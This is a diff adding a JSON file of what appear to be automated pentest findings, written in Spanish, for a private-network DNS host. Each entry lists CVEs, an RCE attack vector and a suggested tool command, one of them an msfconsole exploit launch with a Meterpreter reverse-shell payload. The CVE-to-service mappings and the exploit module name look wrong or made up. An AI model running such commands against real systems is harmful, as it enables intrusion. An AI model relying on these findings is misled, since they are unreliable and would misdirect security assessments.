@@ -1,0 +1,33 @@
+[
+    {
+        "ip": "192.168.139.2",
+        "os": "VMware Player virtual NAT device (90%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (86%)",
+        "puerto": "53",
+        "protocolo": "tcp",
+        "servicio": "tcpwrapped",
+        "version": "No especificada",
+        "cve_identificados": [
+            "CVE-2019-5418",
+            "CVE-2017-1000362"
+        ],
+        "vectores_ataque": "Ejecuci\u00f3n remota de c\u00f3digo (RCE) a trav\u00e9s del servicio DNS sobre TCP en un dispositivo virtual NAT. El objetivo es Windows XP SP3/Windows 7/Server 2012 con el puerto 53 abierto, lo que indica una superficie de ataque amplia para vulnerabilidades de servidores DNS.",
+        "herramienta_sugerida": "msfconsole -x 'use exploit/windows/dns/bind9_dns_server_exec; set RHOSTS 192.168.139.2; set PAYLOAD windows/meterpreter/reverse_tcp; run'",
+        "categoria_vector": "rce"
+    },
+    {
+        "ip": "192.168.139.2",
+        "os": "VMware Player virtual NAT device (90%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (86%)",
+        "puerto": "53",
+        "protocolo": "udp",
+        "servicio": "domain",
+        "version": "(generic dns response: NOTIMP)",
+        "cve_identificados": [
+            "CVE-2019-5418",
+            "CVE-2017-1000362",
+            "CVE-2018-1057"
+        ],
+        "vectores_ataque": "Respuesta DNS maliciosa que explota vulnerabilidades en servidores DNS antiguos (BIND y Windows DNS Server). El atacante env\u00eda paquetes UDP grandes o con registros SOA corruptos, provocando ejecuci\u00f3n remota de c\u00f3digo al procesar la respuesta sin validaci\u00f3n adecuada.",
+        "herramienta_sugerida": "dig @192.168.139.2 -p 53 TXT \"AAAA\" +short +tries=100 +timeout=5",
+        "categoria_vector": "rce"
+    }
+]
